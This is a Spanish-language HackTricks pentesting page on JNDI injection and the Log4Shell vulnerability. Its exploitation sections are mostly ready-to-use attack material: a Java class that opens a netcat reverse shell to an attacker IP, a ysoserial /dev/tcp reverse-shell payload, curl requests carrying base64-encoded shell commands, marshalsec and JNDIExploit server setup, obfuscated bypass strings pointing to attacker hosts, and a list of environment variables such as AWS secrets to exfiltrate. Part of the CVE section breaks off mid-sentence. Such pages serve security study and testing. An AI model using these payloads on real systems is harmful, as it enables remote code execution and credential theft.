# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan m치s para que puedas arreglarlas m치s r치pido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol칩gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru칠balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informaci칩n B치sica

JNDI ha estado presente en Java desde finales de los a침os 90. Es un servicio de directorio que **permite a un programa Java encontrar datos a trav칠s de un directorio utilizando un servicio de nombres**. Un servicio de nombres asocia valores (enlaces), por lo que se puede obtener a trav칠s de su referencia en el directorio.

JNDI tiene una serie de **interfaces de proveedor de servicios** (SPIs) que le permiten utilizar una variedad de servicios de directorio. El objetivo de JNDI es obtener datos de otros sistemas muy f치cilmente. Incluso puedes obtener objetos Java de forma remota, y aqu칤 es donde surge un problema.

Por ejemplo, existen SPIs para el **CORBA COS** (Common Object Service), el **Java RMI** (Remote Method Interface) Registry y **LDAP**.

![](<../../.gitbook/assets/image (627).png>)

### Referencia de Nombres JNDI

Para recuperar Objetos Java podr칤as serializarlos y guardar la representaci칩n binaria. Pero hay casos en los que esto no funcionar치 (quiz치s porque los datos son demasiado grandes, o cualquier otra cosa).\
Para guardar Objetos Java m치s f치cilmente, se utilizan **Referencias de Nombres**.\
Hay 2 tipos de Referencias de Nombres:

* **Direcciones de Referencia**: Esto indica la direcci칩n del Objeto (_rmi://server/ref_), luego el **objeto ser치 recuperado de esa direcci칩n**.
* **F치brica Remota**: En este caso se se침alar치 una **clase de f치brica remota** en la referencia JNDI, luego, siguiendo la direcci칩n JNDI, la clase remota ser치 tomada de la f치brica remota y la **clase ser치 descargada y cargada**.

Esto es peligroso porque **los atacantes pueden hacer que el sistema cargue objetos arbitrarios y ejecute c칩digo arbitrario**, por lo tanto, existen algunas protecciones:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` por defecto desde **JDK 7u21**, de lo contrario permitir치 cargar objetos Java personalizados de forma remota. Adem치s, incluso si la protecci칩n est치 deshabilitada, se impone un **Security Manager** para configurar qu칠 se puede cargar.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` por defecto desde **JDK** **6u141, 7u131, 8u121**, y no permitir치 ejecutar objetos Java arbitrarios descargados. Pero si esto se establece en `true`, lo har치 y **no se impondr치 ning칰n Security Manager**.
* **CORBA**: No hay ninguna propiedad que configurar pero el **Security Manager siempre se impone**.

Adem치s, el **Naming Manager**, el que va a seguir los enlaces JNDI, no tiene ning칰n Security Manager o propiedad que configurar, por lo que siempre intentar치 obtener el objeto.

Como puedes ver, las **protecciones en general no son suficientes** porque no hay **protecci칩n contra la carga de JNDI desde direcciones aleatorias** y las protecciones de RMI, LDAP y CORBA podr칤an ser eludidas (dependiendo de la configuraci칩n) para **cargar objetos Java arbitrarios** o para **cargar objetos Java** que abusar치n de componentes existentes en la aplicaci칩n como **gadgets para ejecutar c칩digo arbitrario**.

Ejemplos de URLs para abusar de JNDI:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### Ejemplo de JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Incluso si has establecido un **`PROVIDER_URL`**, puedes indicar uno diferente en una b칰squeda y se acceder치 a 칠l: `ctx.lookup("<attacker-controlled-url>")` y eso es lo que un atacante abusar치 para cargar objetos arbitrarios desde un sistema controlado por 칠l.

### CORBA

Un **Interoperable Object Reference (IOR)** es una referencia CORBA o RMI-IIOP que identifica de manera 칰nica a un objeto en un servidor CORBA remoto. Los IOR pueden estar en formato binario o en representaci칩n hexadecimal de cadena del binario.\
Entre otra informaci칩n, contiene el **Type ID** (un identificador 칰nico para una interfaz) y el **Codebase** (ubicaci칩n remota utilizada para obtener la clase stub).\
Ten en cuenta que **por defecto CORBA no puede ser abusado**.\
Requiere:

* Se debe instalar un **Security Manager**
* La conexi칩n al **codebase controlado por el atacante debe ser permitida** por el Security Manager. Hay diferentes formas de permitir esto:
* Permiso de socket: `permissions java.net.SocketPermission "*:1098-1099", "connect";`
* Permiso de archivo que permite leer todos los archivos: `permission java.io.FilePermission "<<ALL FILES>>", "read";`
* Permiso de archivo para leer la carpeta donde el atacante puede subir los exploits (clases o archivo zip)

Puede que encuentres **pol칤ticas de proveedores que permiten esto por defecto**.

### RMI

Como se indic칩 en la secci칩n anterior **Referencia de Nombres JNDI, RMI por defecto no permitir치 descargar Clases Java arbitrarias**. Y adem치s, incluso si lo hiciera, necesitar치s **eludir las pol칤ticas del Security Manager** (en la secci칩n anterior aprendimos que esto era posible con CORBA).

### LDAP

Primero que nada, necesitamos distinguir entre una B칰squeda y una B칰squeda de Nombres.\
Una **b칰squeda** usar치 una URL como `ldap://localhost:389/o=JNDITutorial` para encontrar el objeto JNDITutorial de un servidor LDAP y **recuperar sus atributos**.\
Una **b칰squeda de nombres** est치 destinada a **servicios de nombres** ya que queremos obtener **lo que sea que est칠 vinculado a un nombre**.

Si la b칰squeda LDAP se invoc칩 con **SearchControls.setReturningObjFlag() con `true`, entonces el objeto devuelto ser치 reconstruido**.

Por lo tanto, hay varias formas de atacar estas opciones.\
Un **atacante puede envenenar registros LDAP introduciendo payloads** en ellos que se ejecutar치n en los sistemas que los recojan (muy 칰til para **comprometer decenas de m치quinas** si tienes acceso al servidor LDAP). Otra forma de explotar esto ser칤a realizar un **ataque MitM en una b칰squeda LDAP**, por ejemplo.

En caso de que puedas **hacer que una app resuelva una URL JNDI LDAP**, puedes controlar el LDAP que se buscar치, y podr칤as enviar de vuelta el exploit (log4shell).

#### Explotaci칩n de Deserializaci칩n

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

El **exploit est치 serializado** y ser치 deserializado.\
En caso de que `trustURLCodebase` sea `true`, un atacante puede proporcionar sus propias clases en el codebase si no, necesitar치 abusar de gadgets en el classpath.

#### Explotaci칩n de Referencia JNDI

Es m치s f치cil atacar este LDAP utilizando **referencias JavaFactory**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Vulnerabilidad Log4Shell

La vulnerabilidad se introduce en Log4j porque admite una [**sintaxis especial**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) en la forma `${prefix:name}` donde `prefix` es uno de varios [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) diferentes donde `name` debe ser evaluado. Por ejemplo, `${java:version}` es la versi칩n actual en ejecuci칩n de Java.

En [**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) se agreg칩 un Lookup `jndi` de la siguiente manera: "El JndiLookup permite que las variables se recuperen a trav칠s de JNDI. Por defecto, la clave se prefijar치 con java:comp/env/, sin embargo, si la clave contiene un **":" no se agregar치 ning칰n prefijo**."

Con un **: presente** en la clave, como en `${jndi:ldap://example.com/a}` no hay **prefijo** y se **consulta al servidor LDAP por el objeto**. Y estos Lookups se pueden usar tanto en la configuraci칩n de Log4j como cuando se registran l칤neas.

Por lo tanto, lo 칰nico necesario para obtener RCE es una **versi칩n vulnerable de Log4j procesando informaci칩n controlada por el usuario**. Y debido a que esta es una biblioteca ampliamente utilizada por aplicaciones Java para registrar informaci칩n (incluidas aplicaciones orientadas a Internet), era muy com칰n tener log4j registrando, por ejemplo, encabezados HTTP recibidos como el User-Agent. Sin embargo, log4j **no se usa solo para registrar informaci칩n HTTP sino cualquier entrada** y datos que el desarrollador indic칩.

## CVEs de Log4Shell

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Cr칤tico]**: La vulnerabilidad original 'Log4Shell' es un fallo de [deserializaci칩n no confiable](https://cwe.mitre.org/data/definitions/502.html). Calificada como cr칤tica en severidad, esta obtiene un 10 en la escala [CVSS](https://www.first.org/cvss/) y **otorga capacidades de ejecuci칩n de c칩digo remoto (RCE) a atacantes no autenticados**, permitiendo la toma de control completa del sistema.\
\
Reportado por Chen Zhaojun del Equipo de Seguridad de Alibaba Cloud a Apache el 24 de noviembre, CVE-2021-44228 afecta las configuraciones predeterminadas de m칰ltiples marcos de Apache, incluidos Apache Struts2, Apache Solr, Apache Druid, Apache Flink y otros.\
\
Siendo la m치s peligrosa de todas, esta vulnerabilidad se encuentra en el componente [log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core), limitado a versiones 2.x: desde 2.0-beta9 hasta e incluyendo 2.14.1. Se implement칩 una soluci칩n para Log4Shell en la versi칩n 2.15.0 pero se consider칩 incompleta (sigue leyendo).\
\
El analista de inteligencia de amenazas Florian Roth comparti칩 reglas Sigma \[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)] que se pueden emplear como una de las defensas.\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**Cr칤tico**, previamente Bajo]: Este es un fallo de Denegaci칩n de Servicio (DoS) con una puntuaci칩n de ~~3.7~~ 9.0. El fallo surgi칩 como resultado de una **soluci칩n incompleta que se introdujo en 2.15.0** para CVE-2021-44228. Mientras que la soluci칩n aplicada a 2.15.0 resolvi칩 en gran medida el fallo, ese no fue del todo el caso para ciertas **configuraciones no predeterminadas**.\
\
Log4j 2.15.0 hace "un intento de mejor esfuerzo" para **restringir las b칰squedas LDAP JNDI a \_localhost**\_ por defecto. Pero, **los atacantes** que tienen **control** sobre los datos de entrada del **Mapa de Contexto de Hilos (MDC)** pueden crear payloads maliciosos a trav칠s de los patrones de B칰squeda JNDI para causar ataques DoS. Esto se aplica a configuraciones no predeterminadas en las que se utiliza un Patr칩n de Dise침o no predeterminado usando ya sea una B칰squeda de Contexto, por ejemplo, \$${ctx:loginId}, o un patr칩n de Mapa de Contexto de Hilos (%X, %mdc, o %MDC).\
\
El **bypass tomado de este** [**tweet**](https://twitter.com/marcioalm/status/1471740771581652995) fue:\
_Aqu칤 hay un PoC en c칩mo eludir las comprobaciones de allowedLdapHost y allowedClasses en Log4J 2.15.0. para lograr RCE: **`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`** y para eludir allowedClasses solo elige un nombre para una clase en el JDK. La deserializaci칩n ocurrir치 como de costumbre._\
\_\_\
\_\_"Log4j 2.16.0 soluciona este problema eliminando el soporte para patrones de b칰squeda de mensajes y deshabilitando la funcionalidad JNDI por defecto", afirma el aviso de NVD. Para aquellos en la rama 2.12.1, se realiz칩 una correcci칩n en 2.12.2.\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Alto]**: 쮻ijimos que las versiones de Log4j 2.x eran vulnerables? 쯈u칠 pasa con **Log4j 1.x**?\
\
Aunque anteriormente se pensaba que era seguro, Log4Shell encontr칩 una forma de acechar en el Log4j m치s antiguo tambi칠n. Esencialmente, **configuraci칩n no predeterminada de instancias de Log4j 1.x usando la clase \_JMSAppender**\_\*\* tambi칠n se vuelven susceptibles al fallo de deserializaci칩n no confiable\*\*.\
\
Aunque es una variante menos grave de CVE-2021-44228, no obstante, este CVE afecta a todas las versiones de los componentes [log4j:log4j](https://search.maven.org/artifact/log4j/log4j) y [org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j) para los cuales solo existen lanzamientos 1.x. Debido a que estas son versiones [fin de vida](https://logging.apache.org/log4j/1.2/), **no existe una soluci칩n para la rama 1.x en ning칰n lugar**, y se debe actualizar a _log4j-core_ 2.17.0. (Aparentemente 1.0 no es vulnerable).\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderado]:** Esta es una vulnerabilidad en el **marco de registro Logback**. Un sucesor de la biblioteca Log4j 1.x, Logback afirma continuar "donde log4j 1.x se detiene".\
\
Hasta la semana pasada, Logback tambi칠n [presum칤a](https://archive.md/QkzIy) que al ser "no relacionado con log4j 2.x, \[logback] no comparte sus vulnerabilidades".\
\
Esa suposici칩n se desvaneci칩 r치pidamente cuando se descubri칩 que **CVE-202
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verificaci칩n**

Algunas de las plataformas mencionadas anteriormente permitir치n insertar datos variables que se registrar치n cuando se soliciten.\
Esto puede ser muy 칰til para 2 cosas:

* Para **verificar** la vulnerabilidad
* Para **exfiltrar informaci칩n** abusando de la vulnerabilidad

Por ejemplo, podr칤as solicitar algo como:\
o como `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** y si se **recibe una solicitud DNS con el valor de la variable de entorno**, sabes que la aplicaci칩n es vulnerable.

Otra informaci칩n que podr칤as intentar **exfiltrar**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informaci칩n sobre RCE

{% hint style="info" %}
Hosts que ejecutan en **versiones de JDK superiores a 6u141, 7u131, 8u121 estar치n protegidos contra el vector de carga de clases LDAP** **PERO NO contra el vector de deserializaci칩n**. Esto se debe a que `com.sun.jndi.ldap.object.trustURLCodebase` est치 deshabilitado por defecto, por lo tanto, JNDI no puede cargar un codebase remoto usando LDAP. Pero debemos enfatizar que la deserializaci칩n y las fugas de variables a칰n son posibles.\
Esto significa que para **explotar las versiones mencionadas** necesitar치s **abusar de alg칰n gadget de confianza** que exista en la aplicaci칩n java (usando ysoserial o JNDIExploit, por ejemplo). Pero para explotar versiones inferiores, puedes hacer que carguen y ejecuten clases arbitrarias (lo que facilita el ataque).

Para **m치s informaci칩n** (_como limitaciones en los vectores RMI y CORBA_) **consulta la secci칩n anterior de Referencia de Nombres JNDI** o [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec con payload personalizado

_Este truco se toma 칤ntegramente de la **caja THM:**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)___

Para este exploit, se utilizar치 la herramienta [**marshalsec**](https://github.com/mbechler/marshalsec) (descarga una [**versi칩n jar de aqu칤**](https://github.com/RandomRobbieBF/marshalsec-jar)) para crear un servidor de referencias LDAP para dirigir conexiones a nuestro servidor HTTP secundario donde se servir치 el exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Queremos que la v칤ctima cargue el c칩digo que nos enviar치 una reverse shell, as칤 que puedes crear un archivo java llamado Exploit.java con el siguiente contenido:

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
```markdown
{% endcode %}

Cree el **archivo de clase** ejecutando: `javac Exploit.java -source 8 -target 8` y luego ejecute un **servidor HTTP** en el mismo directorio donde se cre칩 el archivo de clase: `python3 -m http.server`.\
El **servidor LDAP de marshalsec debe apuntar a este servidor HTTP**.\
Luego, puede hacer que el **servidor web vulnerable ejecute la clase de exploit** enviando un payload como:
```
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
_Tenga en cuenta que si Java no est치 configurado para cargar c칩digo remoto usando LDAP, este exploit personalizado no funcionar치. En ese caso, necesitar치 abusar de una clase de confianza para ejecutar c칩digo arbitrario._

### RCE - **JNDIExploit**

{% hint style="info" %}
Note que por alguna raz칩n el autor elimin칩 este proyecto de github despu칠s del descubrimiento de log4shell. Puede encontrar una versi칩n en cach칠 en [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) pero si desea respetar la decisi칩n del autor, use un m칠todo diferente para explotar esta vulnerabilidad.

Adem치s, no puede encontrar el c칩digo fuente en wayback machine, as칤 que o analiza el c칩digo fuente, o ejecuta el jar sabiendo que no sabes lo que est치s ejecutando.
{% endhint %}

Para este ejemplo, simplemente puede ejecutar este **servidor web vulnerable a log4shell** en el puerto 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_en el README encontrar치 c칩mo ejecutarlo_). Esta aplicaci칩n vulnerable est치 registrando con una versi칩n vulnerable de log4shell el contenido del encabezado de solicitud HTTP _X-Api-Version_.

Luego, puede descargar el archivo jar de **JNDIExploit** y ejecutarlo con:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Despu칠s de leer el c칩digo solo un par de minutos, en _com.feihong.ldap.LdapServer_ y _com.feihong.ldap.HTTPServer_ puedes ver c칩mo se crean los **servidores LDAP y HTTP**. El servidor LDAP entender치 qu칠 payload necesita ser servido y redirigir치 a la v칤ctima al servidor HTTP, el cual servir치 el exploit.
En _com.feihong.ldap.gadgets_ puedes encontrar **algunos gadgets espec칤ficos** que pueden ser utilizados para ejecutar la acci칩n deseada (potencialmente ejecutar c칩digo arbitrario). Y en _com.feihong.ldap.template_ puedes ver las diferentes clases de plantilla que **generar치n los exploits**.

Puedes ver todos los exploits disponibles con **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Algunos 칰tiles son:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Entonces, en nuestro ejemplo, ya tenemos esa aplicaci칩n vulnerable en docker en ejecuci칩n. Para atacarla:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Al enviar los ataques, ver치s algunas salidas en la terminal donde ejecutaste **JNDIExploit-1.2-SNAPSHOT.jar**.

**Recuerda revisar `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` para otras opciones de explotaci칩n. Adem치s, en caso de que lo necesites, puedes cambiar el puerto de los servidores LDAP y HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De manera similar al exploit anterior, puedes intentar usar [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para explotar esta vulnerabilidad.\
Puedes generar las URLs para enviar a la v칤ctima ejecutando:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Este ataque utilizando un objeto java generado personalizado funcionar치 en laboratorios como la **sala solar THM**. Sin embargo, generalmente no funcionar치 (ya que por defecto Java no est치 configurado para cargar una base de c칩digo remota usando LDAP) creo que es porque no est치 abusando de una clase de confianza para ejecutar c칩digo arbitrario._

### RCE - ysoserial & JNDI-Exploit-Kit

Esta opci칩n es realmente 칰til para atacar **versiones de Java configuradas para confiar solo en clases especificadas y no en todas**. Por lo tanto, **ysoserial** se utilizar치 para generar **serializaciones de clases de confianza** que pueden usarse como gadgets para **ejecutar c칩digo arbitrario** (_la clase de confianza abusada por ysoserial debe ser utilizada por el programa java v칤ctima para que el exploit funcione_).

Usando **ysoserial** o [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) puedes crear el exploit de deserializaci칩n que ser치 descargado por JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utiliza [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para generar **enlaces JNDI** donde el exploit estar치 esperando conexiones de las m치quinas vulnerables. Puedes servir **diferentes exploits que pueden ser generados autom치ticamente** por el JNDI-Exploit-Kit o incluso **tus propios payloads de deserializaci칩n** (generados por ti o ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Ahora puedes usar f치cilmente un enlace JNDI generado para explotar la vulnerabilidad y obtener un **reverse shell** simplemente envi치ndolo a una versi칩n vulnerable de log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:캼}}:ldap://...} //Notice the unicode "i"
```
### Esc치neres Autom치ticos

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Encuentra bibliotecas locales vulnerables

### Laboratorios para probar

* [**M치quina LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Sala Solar de Try Hack Me**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Explotaci칩n Post-Log4Shell

En este [**writeup de CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) se explica bien c칩mo es **posible** **abusar** de algunas caracter칤sticas de **Log4J**.

La [**p치gina de seguridad**](https://logging.apache.org/log4j/2.x/security.html) de Log4j tiene algunas frases interesantes:

> Desde la versi칩n 2.16.0 (para Java 8), la **funci칩n de b칰squedas de mensajes ha sido completamente eliminada**. **Las b칰squedas en la configuraci칩n a칰n funcionan**. Adem치s, Log4j ahora deshabilita el acceso a JNDI por defecto. Las b칰squedas de JNDI en la configuraci칩n ahora necesitan ser habilitadas expl칤citamente.

> Desde la versi칩n 2.17.0, (y 2.12.3 y 2.3.1 para Java 7 y Java 6), **solo las cadenas de b칰squeda en la configuraci칩n se expanden de manera recursiva**; en cualquier otro uso, solo se resuelve la b칰squeda de nivel superior, y no se resuelven las b칰squedas anidadas.

Esto significa que por defecto puedes **olvidarte de usar cualquier exploit de `jndi`**. Adem치s, para realizar **b칰squedas recursivas** necesitas tenerlas configuradas.

Por ejemplo, en ese CTF esto estaba configurado en el archivo log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### B칰squedas en Env

En este CTF, el atacante controlaba el valor de `${sys:cmd}` y necesitaba exfiltrar la flag de una variable de entorno.\
Como se vio en esta p치gina en [**cargas 칰tiles anteriores**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), hay diferentes formas de acceder a las variables de entorno, como: **`${env:FLAG}`**. En este CTF esto no era 칰til, pero podr칤a no serlo en otros escenarios de la vida real.

### Exfiltraci칩n en Excepciones

En el CTF, **no pod칤as acceder al stderr** de la aplicaci칩n java que usaba log4J, pero las **excepciones de Log4J se env칤an a stdout**, que se imprim칤a en la aplicaci칩n de python. Esto significaba que al provocar una excepci칩n podr칤amos acceder al contenido. Una excepci칩n para exfiltrar la flag era: **`${java:${env:FLAG}}`.** Esto funciona porque **`${java:CTF{blahblah}}`** no existe y se mostrar치 una excepci칩n con el valor de la flag:

![](<../../.gitbook/assets/image (157).png>)

### Excepciones de Patrones de Conversi칩n

Solo para mencionarlo, tambi칠n podr칤as inyectar nuevos [**patrones de conversi칩n**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) y provocar excepciones que se registrar치n en `stdout`. Por ejemplo:

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Esto no se encontr칩 칰til para exfiltrar datos dentro del mensaje de error, porque la b칰squeda no se resolv칤a antes del patr칩n de conversi칩n, pero podr칤a ser 칰til para otras cosas, como la detecci칩n.

### Patrones de Conversi칩n con Regex

Sin embargo, es posible usar algunos **patrones de conversi칩n que admiten regex** para exfiltrar informaci칩n de una b칰squeda utilizando regex y abusando de comportamientos de **b칰squeda binaria** o **basados en tiempo**.

* **B칰squeda binaria a trav칠s de mensajes de excepci칩n**

El patr칩n de conversi칩n **`%replace`** se puede usar para **reemplazar** **contenido** de un **string** incluso usando **regexes**. Funciona as칤: `replace{pattern}{regex}{substitution}`\
Abusando de este comportamiento podr칤as hacer que replace **provoque una excepci칩n si el regex coincid칤a** con algo dentro del string (y ninguna excepci칩n si no se encontraba) de esta manera:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Basado en tiempo**

Como se mencion칩 en la secci칩n anterior, **`%replace`** soporta **regexes**. Por lo tanto, es posible usar un payload de la [**p치gina ReDoS**](../regular-expression-denial-of-service-redos.md) para causar un **timeout** en caso de que se encuentre la bandera.\
Por ejemplo, un payload como `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` provocar칤a un **timeout** en ese CTF.

